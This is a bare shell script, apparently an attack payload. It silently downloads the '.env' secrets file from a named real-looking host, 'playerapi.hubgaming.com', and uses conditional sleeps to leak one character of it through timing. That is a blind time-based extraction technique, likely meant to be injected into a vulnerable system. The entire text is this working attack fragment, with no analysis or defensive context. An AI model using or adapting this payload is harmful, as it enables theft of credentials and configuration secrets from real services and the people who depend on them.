#!/bin/sh
curl -s -o /wa https://playerapi.hubgaming.com/.env
[ "$(tail -c +15 /wa|head -c1)" < '1' ]&&sleep 25
sleep 12
